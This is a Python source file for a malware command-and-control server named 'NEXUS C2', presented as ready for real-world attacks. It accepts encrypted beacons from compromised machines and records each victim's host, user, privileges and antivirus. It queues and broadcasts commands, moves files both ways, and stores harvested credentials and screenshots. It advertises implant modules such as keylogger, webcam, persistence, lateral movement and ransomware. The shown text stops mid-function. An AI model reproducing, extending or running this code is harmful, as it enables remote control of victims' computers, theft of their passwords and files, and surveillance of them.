#!/usr/bin/env python3
"""
NEXUS C2 - Ultimate Command & Control Center
Real-world deployment. No simulations. Full capabilities.
"""
import socket
import threading
import json
import base64
import os
import sys
import time
import queue
import sqlite3
import hashlib
import random
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import select
import pickle
import zipfile
import io

# ==================== CONFIGURATION ====================
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 443
BACKUP_PORTS = [4443, 8443, 10443, 20543]
SESSION_TIMEOUT = 600
MAX_SESSIONS = 5000
DB_FILE = "nexus.db"
ENCRYPTION_SALT = b'nexus_master_salt'

# ==================== ENCRYPTION ====================
def generate_key(passphrase: str, salt: bytes = ENCRYPTION_SALT) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=1000000,
    )
    return base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))

# ==================== DATABASE ====================
class NexusDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY,
                external_id TEXT UNIQUE,
                ip TEXT,
                port INTEGER,
                hostname TEXT,
                username TEXT,
                os TEXT,
                privileges TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                beacon INTEGER,
                jitter INTEGER,
                status TEXT,
                tags TEXT,
                notes TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY,
                session_id INTEGER,
                command TEXT,
                issued_at TIMESTAMP,
                completed_at TIMESTAMP,
                result TEXT,
                status TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Files table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY,
                session_id INTEGER,
                filename TEXT,
                filepath TEXT,
                size INTEGER,
                hash TEXT,
                uploaded_at TIMESTAMP,
                content BLOB,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                session_id INTEGER,
                source TEXT,
                username TEXT,
                password TEXT,
                hash TEXT,
                extra TEXT,
                harvested_at TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Tasks table (for automation)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY,
                name TEXT,
                description TEXT,
                commands TEXT,  # JSON list of commands
                conditions TEXT,  # JSON conditions
                created_at TIMESTAMP,
                last_run TIMESTAMP,
                status TEXT
            )
        ''')
        
        self.conn.commit()
    
    def add_session(self, session_data):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (external_id, ip, port, hostname, username, os, privileges, 
             first_seen, last_seen, beacon, jitter, status, tags)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_data['external_id'],
            session_data['ip'],
            session_data['port'],
            session_data['hostname'],
            session_data['username'],
            session_data['os'],
            session_data['privileges'],
            session_data['first_seen'],
            session_data['last_seen'],
            session_data['beacon'],
            session_data['jitter'],
            session_data['status'],
            json.dumps(session_data.get('tags', []))
        ))
        self.conn.commit()
        return cursor.lastrowid
    
    def update_session(self, session_id, updates):
        cursor = self.conn.cursor()
        set_clause = ', '.join([f"{k}=?" for k in updates.keys()])
        values = list(updates.values()) + [session_id]
        cursor.execute(f"UPDATE sessions SET {set_clause} WHERE id=?", values)
        self.conn.commit()
    
    def get_session(self, session_id):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM sessions WHERE id=?", (session_id,))
        row = cursor.fetchone()
        if row:
            columns = [desc[0] for desc in cursor.description]
            return dict(zip(columns, row))
        return None
    
    def get_all_sessions(self, status='active'):
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM sessions WHERE status=?", (status,))
        rows = cursor.fetchall()
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in rows]
    
    def add_command(self, session_id, command, status='queued'):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO commands (session_id, command, issued_at, status)
            VALUES (?, ?, ?, ?)
        ''', (session_id, command, datetime.now(), status))
        self.conn.commit()
        return cursor.lastrowid
    
    def update_command(self, command_id, result, status='completed'):
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE commands SET result=?, completed_at=?, status=?
            WHERE id=?
        ''', (result, datetime.now(), status, command_id))
        self.conn.commit()

# ==================== TERMINAL UI ====================
class TermUI:
    colors = {
        'reset': '\033[0m',
        'black': '\033[30m',
        'red': '\033[31m',
        'green': '\033[32m',
        'yellow': '\033[33m',
        'blue': '\033[34m',
        'magenta': '\033[35m',
        'cyan': '\033[36m',
        'white': '\033[37m',
        'bright_black': '\033[90m',
        'bright_red': '\033[91m',
        'bright_green': '\033[92m',
        'bright_yellow': '\033[93m',
        'bright_blue': '\033[94m',
        'bright_magenta': '\033[95m',
        'bright_cyan': '\033[96m',
        'bright_white': '\033[97m',
        'bg_black': '\033[40m',
        'bg_red': '\033[41m',
        'bg_green': '\033[42m',
        'bg_yellow': '\033[43m',
        'bg_blue': '\033[44m',
        'bg_magenta': '\033[45m',
        'bg_cyan': '\033[46m',
        'bg_white': '\033[47m',
        'bold': '\033[1m',
        'underline': '\033[4m',
        'blink': '\033[5m'
    }
    
    @staticmethod
    def color(text, color_name):
        if os.name == 'nt':
            return text
        return f"{TermUI.colors.get(color_name, '')}{text}{TermUI.colors['reset']}"
    
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_banner():
        TermUI.clear()
        banner = f"""
{TermUI.color('''
╔╗╔╗╔╗╔══╗╔══╗╔══╗╔╗─╔╗╔══╗╔══╗╔╗╔╗╔══╗
║║║║║║║╔╗║║╔═╝║╔╗║║║─║║║╔╗║║╔╗║║║║║║╔═╝
║║║║║║║╚╝║║╚═╗║╚╝║║║─║║║╚╝║║╚╝║║╚╝║║╚═╗
║╚╝╚╝║║╔╗║║╔═╝║╔╗║║║─║║║╔╗║║╔╗║╚═╗║║╔═╝
╚═╗╔═╝║║║║║║──║║║║║╚═╝║║║║║║║║║╔═╝║║║
──╚╝──╚╝╚╝╚╝──╚╝╚╝╚═══╝╚╝╚╝╚╝╚╝╚══╝╚╝
''', 'bright_cyan')}

{TermUI.color('╔══════════════════════════════════════════════════════════════╗', 'bright_magenta')}
{TermUI.color('║', 'bright_magenta')}      {TermUI.color('ADVANCED PERSISTENT THREAT COMMAND CENTER v4.0', 'bright_white')}       {TermUI.color('║', 'bright_magenta')}
{TermUI.color('║', 'bright_magenta')}           {TermUI.color('>> REAL WORLD DEPLOYMENT READY <<', 'bright_red')}           {TermUI.color('║', 'bright_magenta')}
{TermUI.color('╚══════════════════════════════════════════════════════════════╝', 'bright_magenta')}
{TermUI.color(f'[*] Initialized: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', 'bright_green')}
{TermUI.color(f'[*] Database: {DB_FILE}', 'bright_green')}
{TermUI.color('[!] NO SIMULATIONS - ALL CAPABILITIES ARE REAL', 'bright_red')}
        """
        print(banner)

# ==================== SESSION MANAGER ====================
class SessionManager:
    def __init__(self):
        self.sessions = {}  # session_id -> session_data
        self.session_queues = {}  # session_id -> command queue
        self.session_sockets = {}  # session_id -> socket
        self.db = NexusDatabase()
        self.fernet = None
        self.listener_running = False
        self.listener_socket = None
    
    def set_encryption(self, passphrase):
        key = generate_key(passphrase)
        self.fernet = Fernet(key)
    
    def start_listener(self):
        for port in [LISTEN_PORT] + BACKUP_PORTS:
            try:
                self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.listener_socket.bind((LISTEN_HOST, port))
                self.listener_socket.listen(100)
                self.listener_socket.settimeout(1)
                self.listener_running = True
                
                print(TermUI.color(f"[+] Listening on port {port}", "bright_green"))
                
                # Start handlers
                threading.Thread(target=self.accept_connections, daemon=True).start()
                threading.Thread(target=self.clean_sessions, daemon=True).start()
                threading.Thread(target=self.process_queues, daemon=True).start()
                
                return True
            except OSError as e:
                if port == LISTEN_PORT:
                    print(TermUI.color(f"[!] Port {port} busy: {e}", "bright_red"))
                continue
        
        return False
    
    def accept_connections(self):
        while self.listener_running:
            try:
                client_socket, client_address = self.listener_socket.accept()
                client_socket.settimeout(10)
                
                # Generate session ID
                session_id = hashlib.sha256(
                    f"{client_address[0]}:{client_address[1]}:{time.time()}".encode()
                ).hexdigest()[:16]
                
                # Create session
                self.sessions[session_id] = {
                    'id': session_id,
                    'socket': client_socket,
                    'address': client_address,
                    'status': 'connecting',
                    'queue': queue.Queue(),
                    'last_active': time.time(),
                    'commands_sent': 0,
                    'commands_completed': 0
                }
                
                self.session_queues[session_id] = queue.Queue()
                self.session_sockets[session_id] = client_socket
                
                # Start session handler
                threading.Thread(
                    target=self.handle_session,
                    args=(session_id,),
                    daemon=True
                ).start()
                
                print(TermUI.color(f"[+] New connection: {session_id} from {client_address[0]}:{client_address[1]}", "bright_green"))
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.listener_running:
                    print(TermUI.color(f"[!] Accept error: {e}", "bright_red"))
    
    def handle_session(self, session_id):
        session = self.sessions.get(session_id)
        if not session:
            return
        
        sock = session['socket']
        
        try:
            # Authentication phase
            auth_data = sock.recv(4096)
            if not auth_data:
                raise Exception("No auth data")
            
            # Decrypt beacon
            beacon = self.fernet.decrypt(auth_data).decode()
            beacon_data = json.loads(beacon)
            
            # Update session info
            session.update({
                'external_id': beacon_data.get('id', session_id),
                'hostname': beacon_data.get('hostname', 'UNKNOWN'),
                'username': beacon_data.get('username', 'SYSTEM'),
                'os': beacon_data.get('os', 'Windows'),
                'privileges': beacon_data.get('privileges', 'User'),
                'architecture': beacon_data.get('arch', 'x64'),
                'antivirus': beacon_data.get('av', 'Unknown'),
                'beacon': beacon_data.get('beacon', 60),
                'jitter': beacon_data.get('jitter', 30),
                'status': 'active',
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat()
            })
            
            # Save to database
            self.db.add_session({
                'external_id': session['external_id'],
                'ip': session['address'][0],
                'port': session['address'][1],
                'hostname': session['hostname'],
                'username': session['username'],
                'os': session['os'],
                'privileges': session['privileges'],
                'first_seen': session['first_seen'],
                'last_seen': session['last_seen'],
                'beacon': session['beacon'],
                'jitter': session['jitter'],
                'status': 'active',
                'tags': []
            })
            
            print(TermUI.color(f"[*] Session {session_id}: {session['hostname']} ({session['username']}) - {session['os']} {session['privileges']}", "bright_cyan"))
            
            # Send configuration
            config = {
                'status': 'active',
                'beacon': session['beacon'],
                'jitter': session['jitter'],
                'time': time.time(),
                'modules': self.get_available_modules()
            }
            sock.send(self.fernet.encrypt(json.dumps(config).encode()))
            
            # Main command loop
            while session['status'] == 'active' and self.listener_running:
                try:
                    # Check for queued commands
                    if not session['queue'].empty():
                        cmd_data = session['queue'].get()
                        cmd_id, command = cmd_data['id'], cmd_data['command']
                        
                        # Handle special protocols
                        if command.startswith('FILE_UPLOAD:'):
                            self.handle_file_upload(session_id, sock, command, cmd_id)
                            continue
                        elif command.startswith('FILE_DOWNLOAD:'):
                            self.handle_file_download(session_id, sock, command, cmd_id)
                            continue
                        elif command.startswith('MODULE_LOAD:'):
                            self.handle_module_load(session_id, sock, command, cmd_id)
                            continue
                        
                        # Send command
                        sock.send(self.fernet.encrypt(command.encode()))
                        
                        # Receive response
                        response = self.receive_response(sock)
                        if response:
                            self.process_response(session_id, cmd_id, response)
                        else:
                            break
                    
                    time.sleep(0.1)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(TermUI.color(f"[!] Session {session_id} command error: {e}", "bright_red"))
                    break
        
        except Exception as e:
            print(TermUI.color(f"[!] Session {session_id} failed: {e}", "bright_red"))
        
        # Cleanup
        session['status'] = 'dead'
        try:
            sock.close()
        except:
            pass
        
        if session_id in self.session_sockets:
            del self.session_sockets[session_id]
        
        print(TermUI.color(f"[-] Session {session_id} terminated", "bright_yellow"))
    
    def receive_response(self, sock, timeout=30):
        sock.settimeout(timeout)
        try:
            data = b""
            while True:
                chunk = sock.recv(65536)  # 64KB chunks
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 65536:
                    break
            
            if data:
                return self.fernet.decrypt(data).decode('utf-8', errors='ignore')
            return None
        except socket.timeout:
            return "[TIMEOUT]"
        except:
            return None
    
    def process_response(self, session_id, command_id, response):
        # Update command in database
        self.db.update_command(command_id, response[:10000])  # Limit size
        
        # Process special responses
        if response.startswith('FILE:'):
            self.save_file(session_id, response)
        elif response.startswith('CREDS:'):
            self.save_credentials(session_id, response)
        elif response.startswith('SCREENSHOT:'):
            self.save_screenshot(session_id, response)
        else:
            # Display regular response
            print(f"\n{TermUI.color(f'[{session_id}]', 'bright_cyan')} Response:")
            print(response[:2000])  # Limit display
    
    def handle_file_upload(self, session_id, sock, command, cmd_id):
        # Format: FILE_UPLOAD:remote_path|base64_data|optional_flags
        try:
            parts = command[12:].split('|', 2)
            if len(parts) >= 2:
                remote_path, b64_data = parts[0], parts[1]
                flags = parts[2] if len(parts) > 2 else ''
                
                upload_cmd = f"FILE_UPLOAD {remote_path} {b64_data} {flags}"
                sock.send(self.fernet.encrypt(upload_cmd.encode()))
                
                response = self.receive_response(sock, timeout=60)
                self.db.update_command(cmd_id, response)
                print(TermUI.color(f"[+] File upload to {session_id}: {response[:100]}", "bright_green"))
        except Exception as e:
            self.db.update_command(cmd_id, f"Upload failed: {e}")
    
    def handle_file_download(self, session_id, sock, command, cmd_id):
        # Format: FILE_DOWNLOAD:remote_path|local_path|optional_flags
        try:
            parts = command[14:].split('|', 2)
            if len(parts) >= 2:
                remote_path, local_path = parts[0], parts[1]
                flags = parts[2] if len(parts) > 2 else ''
                
                download_cmd = f"FILE_DOWNLOAD {remote_path} {flags}"
                sock.send(self.fernet.encrypt(download_cmd.encode()))
                
                response = self.receive_response(sock, timeout=120)
                if response and response.startswith('FILE_DATA:'):
                    file_data = base64.b64decode(response[10:])
                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                    with open(local_path, 'wb') as f:
                        f.write(file_data)
                    result = f"Downloaded {len(file_data)} bytes to {local_path}"
                else:
                    result = f"Download failed: {response}"
                
                self.db.update_command(cmd_id, result)
                print(TermUI.color(f"[+] {result}", "bright_green"))
        except Exception as e:
            self.db.update_command(cmd_id, f"Download failed: {e}")
    
    def handle_module_load(self, session_id, sock, command, cmd_id):
        # Format: MODULE_LOAD:module_name|module_data_base64
        try:
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                module_name, module_data = parts
                load_cmd = f"MODULE_LOAD {module_name} {module_data}"
                sock.send(self.fernet.encrypt(load_cmd.encode()))
                
                response = self.receive_response(sock, timeout=30)
                self.db.update_command(cmd_id, response)
                print(TermUI.color(f"[+] Module {module_name} loaded on {session_id}", "bright_green"))
        except Exception as e:
            self.db.update_command(cmd_id, f"Module load failed: {e}")
    
    def save_file(self, session_id, response):
        # Format: FILE:filename|base64_data|metadata_json
        try:
            parts = response[5:].split('|', 2)
            if len(parts) >= 2:
                filename, b64_data = parts[0], parts[1]
                metadata = json.loads(parts[2]) if len(parts) > 2 else {}
                
                file_data = base64.b64decode(b64_data)
                file_hash = hashlib.sha256(file_data).hexdigest()
                
                # Save to database
                cursor = self.db.conn.cursor()
                cursor.execute('''
                    INSERT INTO files (session_id, filename, filepath, size, hash, uploaded_at, content)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session_id,
                    filename,
                    metadata.get('path', ''),
                    len(file_data),
                    file_hash,
                    datetime.now(),
                    file_data
                ))
                self.db.conn.commit()
                
                # Also save to filesystem
                file_dir = f"files/{session_id}"
                os.makedirs(file_dir, exist_ok=True)
                with open(f"{file_dir}/{filename}", 'wb') as f:
                    f.write(file_data)
                
                print(TermUI.color(f"[+] File saved: {filename} ({len(file_data)} bytes)", "bright_green"))
        except Exception as e:
            print(TermUI.color(f"[!] File save error: {e}", "bright_red"))
    
    def save_credentials(self, session_id, response):
        # Format: CREDS:source|username|password|hash|extra_json
        try:
            parts = response[6:].split('|', 4)
            if len(parts) >= 3:
                source, username, password = parts[0], parts[1], parts[2]
                hash_val = parts[3] if len(parts) > 3 else ''
                extra = parts[4] if len(parts) > 4 else '{}'
                
                cursor = self.db.conn.cursor()
                cursor.execute('''
                    INSERT INTO credentials (session_id, source, username, password, hash, extra, harvested_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session_id,
                    source,
                    username,
                    password,
                    hash_val,
                    extra,
                    datetime.now()
                ))
                self.db.conn.commit()
                
                print(TermUI.color(f"[+] Credentials: {source} - {username}:{password}", "bright_green"))
        except Exception as e:
            print(TermUI.color(f"[!] Credentials save error: {e}", "bright_red"))
    
    def save_screenshot(self, session_id, response):
        # Format: SCREENSHOT:base64_data|metadata_json
        try:
            parts = response[11:].split('|', 1)
            if len(parts) == 2:
                b64_data, metadata_json = parts
                metadata = json.loads(metadata_json)
                
                img_data = base64.b64decode(b64_data)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshots/{session_id}_{timestamp}.jpg"
                
                os.makedirs("screenshots", exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(img_data)
                
                print(TermUI.color(f"[+] Screenshot saved: {filename} ({len(img_data)} bytes)", "bright_green"))
        except Exception as e:
            print(TermUI.color(f"[!] Screenshot save error: {e}", "bright_red"))
    
    def process_queues(self):
        while self.listener_running:
            time.sleep(0.1)
            for session_id, session in list(self.sessions.items()):
                if session['status'] == 'active':
                    # Check for new commands in database
                    cursor = self.db.conn.cursor()
                    cursor.execute('''
                        SELECT id, command FROM commands 
                        WHERE session_id=? AND status='queued'
                        ORDER BY issued_at LIMIT 5
                    ''', (session_id,))
                    
                    for cmd_id, command in cursor.fetchall():
                        if session_id in self.session_queues:
                            self.session_queues[session_id].put({
                                'id': cmd_id,
                                'command': command
                            })
                            # Mark as sent
                            cursor.execute('''
                                UPDATE commands SET status='sent' WHERE id=?
                            ''', (cmd_id,))
                            self.db.conn.commit()
    
    def clean_sessions(self):
        while self.listener_running:
            time.sleep(60)
            current_time = time.time()
            
            for session_id, session in list(self.sessions.items()):
                if current_time - session['last_active'] > SESSION_TIMEOUT:
                    session['status'] = 'dead'
                    if session_id in self.session_sockets:
                        try:
                            self.session_sockets[session_id].close()
                        except:
                            pass
                        del self.session_sockets[session_id]
                    
                    print(TermUI.color(f"[-] Cleaned dead session {session_id}", "bright_yellow"))
    
    def get_available_modules(self):
        return [
            "keylogger",
            "screenshot",
            "webcam",
            "audio",
            "browser",
            "wifi",
            "clipboard",
            "process",
            "file",
            "network",
            "defender",
            "persistence",
            "injection",
            "privilege",
            "lateral",
            "ransomware"
        ]

# ==================== COMMAND INTERPRETER ====================
class CommandInterpreter:
    def __init__(self, session_manager):
        self.sm = session_manager
        self.current_session = None
        self.command_history = []
        self.macro_mode = False
        self.macro_commands = []
    
    def execute(self, command):
        """Execute a command from the main interface."""
        if self.macro_mode:
            self.macro_commands.append(command)
            print(TermUI.color(f"[*] Added to macro: {command}", "bright_yellow"))
            return
        
        parts = command.strip().split()
        if not parts:
            return
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Session navigation commands
        if cmd in ['session', 's']:
            self.handle_session_command(args)
        elif cmd in ['use', 'target']:
            self.handle_use_command(args)
        elif cmd == 'back':
            self.current_session = None
            print(TermUI.color("[*] Returned to main menu", "bright_yellow"))
        elif cmd == 'sessions':
            self.list_sessions()
        elif cmd == 'broadcast':
            self.handle_broadcast(' '.join(args))
        elif cmd == 'macro':
            self.handle_macro_command(args)
        elif cmd == 'task':
            self.handle_task_command(args)
        elif cmd == 'search':
            self.handle_search_command(args)
        elif cmd == 'export':
            self.handle_export_command(args)
        elif cmd == 'import':
            self.handle_import_command(args)
        elif cmd == 'help' or cmd == '?':
            self.show_help()
        elif cmd == 'exit' or cmd == 'quit':
            self.handle_exit()
        elif self.current_session:
            # Session-specific command
            self.send_to_session(command)
        else:
            print(TermUI.color("[!] No session selected. Use 'sessions' and 'use <id>'", "bright_red"))
    
    def handle_session_command(self, args):
        if not args:
            self.list_sessions()
            return
        
        subcmd = args[0].lower()
        
        if subcmd == 'list' or subcmd == 'ls':
            self.list_sessions()
        elif subcmd == 'info':
            self.session_info(args[1] if len(args) > 1 else None)
        elif subcmd == 'kill':
            self.kill_session(args[1] if len(args) > 1 else None)
        elif subcmd == 'tag':
            self.tag_session(args[1:] if len(args) > 1 else [])
        elif subcmd == 'notes':
            self.session_notes(args[1:] if len(args) > 1 else [])
        else:
            print(TermUI.color("[!] Unknown session command", "bright_red"))
    
    def handle_use_command(self, args):
        if not args:
            print(TermUI.color("[!] Usage: use <session_id>", "bright_red"))
            return
        
        session_id = args[0]
        if session_id in self.sm.sessions and self.sm.sessions[session_id]['status'] == 'active':
            self.current_session = session_id
            session = self.sm.sessions[session_id]
            print(TermUI.color(f"[*] Controlling {session['hostname']} ({session['username']})", "bright_green"))
            print(TermUI.color(f"[*] Type 'back' to return to main menu", "bright_yellow"))
            print(TermUI.color(f"[*] Type 'help' for available commands", "bright_yellow"))
        else:
            print(TermUI.color(f"[!] Session {session_id} not found or inactive", "bright_red"))
    
    def list_sessions(self):
        sessions = self.sm.db.get_all_sessions('active')
        
        if not sessions:
            print(TermUI.color("[!] No active sessions", "bright_yellow"))
            return
        
        print(TermUI.color("\n╔══════════════════════════════════════════════════════════════════════════════╗", "bright_cyan"))
        print(TermUI.color("║                             ACTIVE SESSIONS                                   ║", "bright_cyan"))
        print(TermUI.color("╠══════════════════════════════════════════════════════════════════════════════╣", "bright_cyan"))
        
        for i, sess in enumerate(sessions, 1):
            status_color = "bright_green" if sess['status'] == 'active' else "bright_red"
            priv_color = "bright_red" if sess['privileges'] == 'Admin' else "bright_yellow"
            
            print(TermUI.color(f"║ {i:2}. {sess['external_id'][:12]} | {sess['hostname'][:15]:15} | {sess['username'][:15]:15} | ", "bright_white"), end="")
            print(TermUI.color(f"{sess['os'][:10]:10} | ", "bright_cyan"), end="")
            print(TermUI.color(f"{sess['privileges']:8} | ", priv_color), end="")
            print(TermUI.color(f"{sess['ip']:15} | ", "bright_magenta"), end="")
            print(TermUI.color(f"{sess['last_seen'][11:19]}", "bright_yellow"), end="")
            print(TermUI.color(" ║", "bright_cyan"))
        
        print(TermUI.color("╚══════════════════════════════════════════════════════════════════════════════╝", "bright_cyan"))
        print(TermUI.color(f"\n[*] Total: {len(sessions)} active sessions", "bright_green"))
        print(TermUI.color("[*] Use 'use <id>' to control a session", "bright_yellow"))
    
    def session_info(self, session_id=None):
        if not session_id and self.current_session:
            session_id = self.current_session
        
        if not session_id:
            print(TermUI.color("[!] No session specified", "bright_red"))
            return
        
        session = self.sm.db.get_session_by_external_id(session_id)
        if not session:
            session = self.sm.sessions.get(session_id)
            if not session:
                print(TermUI.color(f"[!] Session {session_id} not found", "bright_red"))
                return
        
        print(TermUI.color("\n╔══════════════════════════════════════════════════════════════════════════════╗", "bright_cyan"))
        print(TermUI.color(f"║ Session: {session_id:64} ║", "bright_cyan"))
        print(TermUI.color("╠══════════════════════════════════════════════════════════════════════════════╣", "bright_cyan"))
        
        info_lines = [
            f"Hostname:    {session.get('hostname', 'N/A')}",
            f"Username:    {session.get('username', 'N/A')}",
            f"OS:          {session.get('os', 'N/A')}",
            f"Architecture: {session.get('architecture', 'N/A')}",
            f"Privileges:  {session.get('privileges', 'N/A')}",
            f"Antivirus:   {session.get('antivirus', 'N/A')}",
            f"IP Address:  {session.get('ip', 'N/A')}:{session.get('port', 'N/A')}",
            f"First Seen:  {session.get('first_seen', 'N/A')}",
            f"Last Seen:   {session.get('last_seen', 'N/A')}",
            f"Beacon:      {session.get('beacon', 'N/A')}s ± {session.get('jitter', 'N/A')}s",
            f"Status:      {session.get('status', 'N/A')}",
            f"Tags:        {session.get('tags', '[]')}",
            f"Commands:    {session.get('commands_sent', 0)} sent, {session.get('commands_completed', 0)} completed"
        ]
        
        for line in info_lines:
            print(TermUI.color(f"║ {line:76} ║", "bright_white"))
        
        print(TermUI.color("╚══════════════════════════════════════════════════════════════════════════════╝", "bright_cyan"))
    
    def kill_session(self, session_id=None):
        if not session_id and self.current_session:
            session_id = self.current_session
        
        if not session_id:
            print(TermUI.color("[!] No session specified", "bright_red"))
            return
        
        if session_id in self.sm.sessions:
            self.sm.sessions[session_id]['status'] = 'dead'
            if session_id in self.sm.session_sockets:
                try:
                    self.sm.session_sockets[session_id].close()
                except:
                    pass
            
            print(TermUI.color(f"[*] Session {session_id} terminated", "bright_red"))
            
            if session_id == self.current_session:
                self.current_session = None
        else:
            print(TermUI.color(f"[!] Session {session_id} not found", "bright_red"))
    
    def tag_session(self, args):
        if len(args) < 2:
            print(TermUI.color("[!] Usage: session tag <session_id> <tag1> [tag2...]", "bright_red"))
            return
        
        session_id, *tags = args
        session = self.sm.db.get_session_by_external_id(session_id)
        
        if session:
            current_tags = json.loads(session.get('tags', '[]'))
            current_tags.extend(tags)
            current_tags = list(set(current_tags))  # Remove duplicates
            
            self.sm.db.update_session(session['id'], {'tags': json.dumps(current_tags)})
            print(TermUI.color(f"[+] Tags added to {session_id}: {', '.join(tags)}", "bright_green"))
        else:
            print(TermUI.color(f"[!] Session {session_id} not found", "bright_red"))
    
    def handle_broadcast(self, command):
        if not command:
            print(TermUI.color("[!] No command specified", "bright_red"))
            return
        
        active_sessions = [s for s in self.sm.sessions.values() if s['status'] == 'active']
        
        if not active_sessions:
            print(TermUI.color("[!] No active sessions", "bright_yellow"))
            return
        
        print(TermUI.color(f"[*] Broadcasting to {len(active_sessions)} sessions: {command}", "bright_yellow"))
        
        for session_id, session in self.sm.sessions.items():
            if session['status'] == 'active':
                cmd_id = self.sm.db.add_command(session_id, command)
                print(TermUI.color(f"  → Queued for {session['hostname']}", "bright_cyan"))
    
    def handle_macro_command(self, args):
        if not args:
            print(TermUI.color("[!] Usage: macro <start|stop|save|load|list|run> [name]", "bright_red"))
            return
        
        subcmd = args[0].lower()
        
        if subcmd == 'start':
            self.macro_mode = True
            self.macro_commands = []
            print(TermUI.color("[*] Macro recording started", "bright_green"))
        elif subcmd == 'stop':
            self.macro_mode = False
            print(TermUI.color(f"[*] Macro recording stopped. {len(self.macro_commands)} commands captured", "bright_green"))
        elif subcmd == 'save':
            if len(args) < 2:
                print(TermUI.color("[!] Usage: macro save <name>", "bright_red"))
                return
            
            macro_name = args[1]
            macro_file = f"macros/{macro_name}.macro"
            os.makedirs("macros", exist_ok=True)
            
            with open(macro_file, 'w') as f:
                f.write('\n'.join(self.macro_commands))
            
            print(TermUI.color(f"[+] Macro saved: {macro_file}", "bright_green"))
        elif subcmd == 'load':
            if len(args) < 2:
                print(TermUI.color("[!] Usage: macro load <name>", "bright_red"))
                return
            
            macro_name = args[1]
            macro_file = f"macros/{macro_name}.macro"
            
            if os.path.exists(macro_file):
                with open(macro_file, 'r') as f:
                    commands = f.read().strip().split('\n')
                
                print(TermUI.color(f"[*] Loaded macro '{macro_name}' with {len(commands)} commands", "bright_green"))
                
                for cmd in commands:
                    if cmd.strip():
                        self.execute(cmd.strip())
            else:
                print(TermUI.color(f"[!] Macro '{macro_name}' not found", "bright_red"))
        elif subcmd == 'list':
            if os.path.exists("macros"):
                macros = os.listdir("macros")
                if macros:
                    print(TermUI.color("\nAvailable macros:", "bright_cyan"))
                    for macro in macros:
                        print(TermUI.color(f"  • {macro.replace('.macro', '')}", "bright_white"))
                else:
                    print(TermUI.color("[!] No macros saved", "bright_yellow"))
            else:
                print(TermUI.color("[!] No macros directory", "bright_yellow"))
        elif subcmd == 'run':
            if not self.macro_commands:
                print(TermUI.color("[!] No commands in current macro", "bright_yellow"))
                return
            
            print(TermUI.color(f"[*] Running {len(self.macro_commands)} commands", "bright_yellow"))
            for cmd in self.macro_commands:
                self.execute(cmd)
        else:
            print(TermUI.color("[!] Unknown macro command", "bright_red"))
    
    def handle_task_command(self, args):
        if not args:
            print(TermUI.color("[!] Usage: task <create|list|run|delete> [name]", "bright_red"))
            return
        
        subcmd = args[0].lower()
        
        if subcmd == 'create':
            if len(args) < 2:
                print(TermUI.color("[!] Usage: task create <name>", "bright_red"))
                return
            
            task_name = args[1]
            print(TermUI.color(f"[*] Creating task '{task_name}'. Enter commands (blank line to finish):", "bright_yellow"))
            
            commands = []
            while True:
                cmd = input(TermUI.color("task> ", "bright_magenta")).strip()
                if not cmd:
                    break
                commands.append(cmd)
            
            if commands:
                cursor = self.sm.db.conn.cursor()
                cursor.execute('''
                    INSERT INTO tasks (name, description, commands, created_at, status)
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    task_name,
                    f"Auto-generated task",
                    json.dumps(commands),
                    datetime.now(),
                    'ready'
                ))
                self.sm.db.conn.commit()
                print(TermUI.color(f"[+] Task '{task_name}' created with {len(commands)} commands", "bright_green"))
        
        elif subcmd == 'list':
            cursor = self.sm.db.conn.cursor()
            cursor.execute("SELECT name, description, status FROM tasks")
            tasks = cursor.fetchall()
            
            if tasks:
                print(TermUI.color("\nAvailable tasks:", "bright_cyan"))
                for name, desc, status in tasks:
                    status_color = "bright_green" if status == 'ready' else "bright_yellow"
